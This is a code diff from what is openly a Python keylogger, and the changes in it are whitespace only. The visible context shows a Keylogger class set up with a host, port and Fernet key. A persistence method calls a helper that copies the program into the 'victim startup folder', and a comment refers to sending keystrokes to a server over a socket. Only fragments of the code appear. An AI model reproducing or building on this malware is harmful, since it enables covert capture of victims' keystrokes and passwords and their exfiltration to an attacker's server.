@@ -4,7 +4,6 @@ from cryptography.fernet import Fernet # Fernet library, uses synmetric key for 
 import sys # for interacting with Python Interpreter 
 import manipulate # used manipulate.py script to copy keylogger script to startup folder
 
-
 class Keylogger():
 
 	def __init__(self, Host, Port, crypt_key):
@@ -48,7 +47,7 @@ class Keylogger():
 
 		# Method for copying executable program to victim startup folder 
 	def persistance(self):
-
+		
 		manipulate.path_manipulation()
 
 	  # Method for sending keystrokes to Server via socket
